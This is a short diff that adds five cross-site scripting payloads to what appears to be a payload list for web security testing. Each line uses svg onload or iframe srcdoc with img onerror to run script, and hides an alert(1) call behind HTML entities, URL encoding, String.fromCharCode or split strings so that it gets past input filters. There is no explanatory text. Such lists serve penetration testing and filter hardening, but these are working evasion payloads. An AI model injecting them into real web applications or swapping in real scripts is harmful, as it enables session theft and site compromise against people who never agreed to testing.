@@ -1,0 +1,5 @@
+<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<svg onload=setTimeout('al'+'ert(1)',0)>
+<iframe srcdoc="<img src=x onerror=window['al'+'ert'](1)>"></iframe>
